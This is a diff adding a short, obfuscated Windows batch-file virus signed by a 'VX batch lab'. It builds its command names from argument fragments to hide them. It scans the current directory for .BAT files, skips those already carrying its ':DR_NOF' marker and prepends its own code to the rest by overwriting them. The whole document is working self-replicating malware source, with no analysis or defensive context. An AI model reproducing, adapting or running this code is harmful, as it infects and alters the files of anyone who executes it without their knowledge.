@@ -1,0 +1,30 @@
+---------------------------------------------------
+:DR_NOF
+@ECHO %NOF-%OFF>NUL&SET W="%0"
+CALL :_NOF FI TY GO HO MO EL SE IR BB
+GOTO ENOF
+:_NOF
+%7T NOF#=0
+D%8 %CD%\*.B%9 /B /A>~.NOF
+EC%4/END>>~.NOF
+:NOF_
+%1ND "NOF"<%W%>$.NOF
+%5RE +%NOF#% ~.NOF>-.NOF
+%7T /P NOF$=<-.NOF
+IF %NOF$%'==END' %3TO ENOF
+%7T /P PI=<%NOF$%
+%7T /A NOF#=%NOF#%+1
+IF -%PI%==-:DR_NOF %3TO NOF_
+%2PE %NOF$%>>$.NOF
+%5VE $.NOF %NOF$%>NUL
+%3TO NOF_
+:ENOF
+D%6 ?.NOF
+
+
+
+--------------------------------------------------
+
+====-------=-==-===-----==
+| DR RUSTAM/VX BATCH LAB |
+====--=-====-----=-=-====-
